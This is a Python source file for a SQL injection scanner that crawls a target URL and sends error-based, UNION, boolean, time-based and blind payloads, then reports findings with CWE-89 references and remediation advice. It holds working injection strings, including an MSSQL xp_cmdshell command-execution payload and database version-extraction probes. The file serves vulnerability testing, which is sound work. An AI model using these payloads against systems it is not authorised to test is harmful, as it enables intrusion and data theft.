# base/scanners/detectors/sql_injection_detector.py
import aiohttp
import asyncio
import re
from urllib.parse import urlparse, urlencode, parse_qs
import time

class SQLInjectionDetector:
    """Advanced SQL injection detector with multiple detection methods"""
    
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or aiohttp.ClientSession()
        self.findings = []
        
    async def scan(self):
        """Run comprehensive SQL injection scan"""
        
        # Find all injection points
        injection_points = await self._find_injection_points()
        
        for point in injection_points:
            # Test each detection method
            await self._test_error_based(point)
            await self._test_union_based(point)
            await self._test_boolean_based(point)
            await self._test_time_based(point)
            await self._test_blind_based(point)
        
        return self.findings
    
    async def _find_injection_points(self):
        """Find all potential SQL injection points"""
        points = []
        
        try:
            async with self.session.get(self.target_url) as response:
                html = await response.text()
                
                # Extract forms
                forms = self._extract_forms(html)
                for form in forms:
                    points.append({
                        'type': 'form',
                        'url': self.target_url,
                        'method': form.get('method', 'get'),
                        'inputs': form.get('inputs', [])
                    })
                
                # Extract URL parameters
                parsed = urlparse(self.target_url)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    points.append({
                        'type': 'url_param',
                        'url': self.target_url,
                        'params': list(params.keys())
                    })
                    
        except Exception as e:
            print(f"Error finding injection points: {e}")
        
        return points
    
    async def _test_error_based(self, point):
        """Test for error-based SQL injection"""
        
        error_payloads = {
            'mysql': [
                "'", "\"", "''", "\"\"", "' OR '1'='1", "' OR '1'='1'--",
                "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1--",
                "admin'--", "admin' #", "' UNION SELECT NULL--",
                "' AND 1=CONVERT(int, @@version)--"
            ],
            'postgresql': [
                "'", "';", "' OR '1'='1", "' OR 1=1--", "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL, NULL--", "' AND 1=CAST(version() AS int)--"
            ],
            'mssql': [
                "'", "\"", "';", "' OR '1'='1", "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT @@version--", "'; EXEC xp_cmdshell('dir')--"
            ],
            'oracle': [
                "'", "' OR '1'='1", "' UNION SELECT NULL FROM DUAL--",
                "' AND 1=UTL_INADDR.get_host_name('10.0.0.1')--"
            ]
        }
        
        error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"Uncaught mysqli_sql_exception",
                r"MySQL server version",
                r"Syntax error.*MySQL",
                r"Microsoft OLE DB.*for ODBC.*MySQL"
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Npgsql",
                r"PG::SyntaxError",
                r"org.postgresql.util.PSQLException",
                r"ERROR:\s\ssyntax error at or near",
                r"ERROR:\s\srelation.*does not exist"
            ],
            'mssql': [
                r"Driver.*SQL Server",
                r"SQL Server.*Driver",
                r"Warning.*sqlsrv_.*",
                r"SQLServer JDBC Driver",
                r"System.Data.SqlClient.SqlException",
                r"Unclosed quotation mark",
                r"Incorrect syntax near",
                r"Microsoft OLE DB.*for SQL Server"
            ],
            'oracle': [
                r"ORA-[0-9]{5}",
                r"Oracle.*Driver",
                r"OracleException",
                r"oracle.jdbc",
                r"SQLSyntaxErrorException",
                r"ORA-00933",
                r"ORA-01756",
                r"ORA-00942"
            ]
        }
        
        for db_type, payloads in error_payloads.items():
            for payload in payloads:
                test_url = self._build_test_url(point, payload)
                
                try:
                    async with self.session.get(test_url) as response:
                        html = await response.text()
                        
                        # Check for database errors
                        for pattern in error_patterns[db_type]:
                            if re.search(pattern, html, re.IGNORECASE):
                                self.findings.append({
                                    'name': f'Error-Based SQL Injection ({db_type})',
                                    'description': f'Database error reveals SQL injection vulnerability',
                                    'severity': 'critical',
                                    'cvss_score': 9.0,
                                    'cwe_id': 'CWE-89',
                                    'evidence': f'Payload: {payload}\nError pattern: {pattern}',
                                    'remediation': 'Use parameterized queries and input validation',
                                    'references': ['https://owasp.org/www-community/attacks/SQL_Injection']
                                })
                                return  # Found vulnerability, stop testing
                                
                except Exception as e:
                    continue
    
    async def _test_union_based(self, point):
        """Test for UNION-based SQL injection"""
        
        # Detect number of columns
        for i in range(1, 10):
            payload = f"' UNION SELECT {','.join(['NULL']*i)}--"
            test_url = self._build_test_url(point, payload)
            
            try:
                async with self.session.get(test_url) as response:
                    html = await response.text()
                    
                    # Check if page displays data (not error)
                    if response.status == 200 and 'error' not in html.lower():
                        self.findings.append({
                            'name': 'Union-Based SQL Injection',
                            'description': f'Application vulnerable to UNION-based SQL injection with {i} columns',
                            'severity': 'critical',
                            'cvss_score': 9.0,
                            'cwe_id': 'CWE-89',
                            'evidence': f'Payload: {payload}\nColumns detected: {i}',
                            'remediation': 'Use parameterized queries and input validation'
                        })
                        return
            except:
                continue
    
    async def _test_boolean_based(self, point):
        """Test for boolean-based blind SQL injection"""
        
        # Get baseline response
        baseline = await self._get_baseline_response(point)
        
        true_payloads = ["' AND '1'='1", "' AND 1=1--", "' OR '1'='1", "') AND ('1'='1"]
        false_payloads = ["' AND '1'='2", "' AND 1=2--", "' OR '1'='2", "') AND ('1'='2"]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            true_url = self._build_test_url(point, true_payload)
            false_url = self._build_test_url(point, false_payload)
            
            try:
                async with self.session.get(true_url) as true_response:
                    true_html = await true_response.text()
                
                async with self.session.get(false_url) as false_response:
                    false_html = await false_response.text()
                
                # If true and false responses differ significantly
                if len(true_html) != len(false_html) or true_html != false_html:
                    if abs(len(true_html) - len(false_html)) > 100:  # Significant difference
                        self.findings.append({
                            'name': 'Boolean-Based Blind SQL Injection',
                            'description': 'Application behavior differs between true/false conditions',
                            'severity': 'high',
                            'cvss_score': 7.5,
                            'cwe_id': 'CWE-89',
                            'evidence': f'True payload: {true_payload}\nFalse payload: {false_payload}',
                            'remediation': 'Use parameterized queries and consistent error handling'
                        })
                        return
            except:
                continue
    
    async def _test_time_based(self, point):
        """Test for time-based blind SQL injection"""
        
        time_payloads = {
            'mysql': ["' OR SLEEP(5)--", "' AND SLEEP(5)--", "'; SELECT SLEEP(5)--"],
            'postgresql': ["' OR pg_sleep(5)--", "' AND pg_sleep(5)--"],
            'mssql': ["'; WAITFOR DELAY '00:00:05'--", "' OR WAITFOR DELAY '00:00:05'--"]
        }
        
        for db_type, payloads in time_payloads.items():
            for payload in payloads:
                test_url = self._build_test_url(point, payload)
                
                try:
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        await response.text()
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 5:
                        self.findings.append({
                            'name': f'Time-Based Blind SQL Injection ({db_type})',
                            'description': f'Application delays {elapsed:.1f} seconds, indicating time-based injection',
                            'severity': 'high',
                            'cvss_score': 7.5,
                            'cwe_id': 'CWE-89',
                            'evidence': f'Payload: {payload}\nDelay: {elapsed:.1f} seconds',
                            'remediation': 'Use parameterized queries and prepared statements'
                        })
                        return
                except:
                    continue
    
    async def _test_blind_based(self, point):
        """Test for blind SQL injection using conditional responses"""
        
        # Test extracting database version bit by bit
        payloads = [
            "' AND ASCII(SUBSTRING(@@version,1,1)) > 64--",
            "' AND ASCII(SUBSTRING(@@version,1,1)) < 91--",
            "' AND LENGTH(@@version) > 5--"
        ]
        
        for payload in payloads:
            test_url = self._build_test_url(point, payload)
            
            try:
                async with self.session.get(test_url) as response:
                    html = await response.text()
                    
                    # Check if page loads normally (condition true)
                    if response.status == 200 and len(html) > 0:
                        # Continue with more precise queries
                        pass
            except:
                continue
    
    def _build_test_url(self, point, payload):
        """Build test URL with payload"""
        if point['type'] == 'url_param':
            parsed = urlparse(point['url'])
            params = parse_qs(parsed.query)
            
            # Inject into first parameter
            param_name = point['params'][0]
            params[param_name] = [payload]
            
            query_string = urlencode(params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
        
        return point['url']
    
    async def _get_baseline_response(self, point):
        """Get baseline response for comparison"""
        try:
            async with self.session.get(point['url']) as response:
                return await response.text()
        except:
            return ""
    
    def _extract_forms(self, html):
        """Extract forms from HTML"""
        forms = []
        form_pattern = r'<form.*?>(.*?)</form>'
        
        for form_match in re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE):
            form_html = form_match.group(1)
            form = {
                'action': self._extract_attribute(form_match.group(0), 'action'),
                'method': self._extract_attribute(form_match.group(0), 'method', 'get'),
                'inputs': []
            }
            
            # Extract inputs
            input_pattern = r'<input.*?>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_type = self._extract_attribute(input_match.group(0), 'type', 'text')
                input_name = self._extract_attribute(input_match.group(0), 'name')
                if input_name:
                    form['inputs'].append({
                        'type': input_type,
                        'name': input_name
                    })
            
            forms.append(form)
        
        return forms
    
    def _extract_attribute(self, tag, attr, default=''):
        pattern = f'{attr}=[\'"](.*?)[\'"]'
        match = re.search(pattern, tag, re.IGNORECASE)
        return match.group(1) if match else default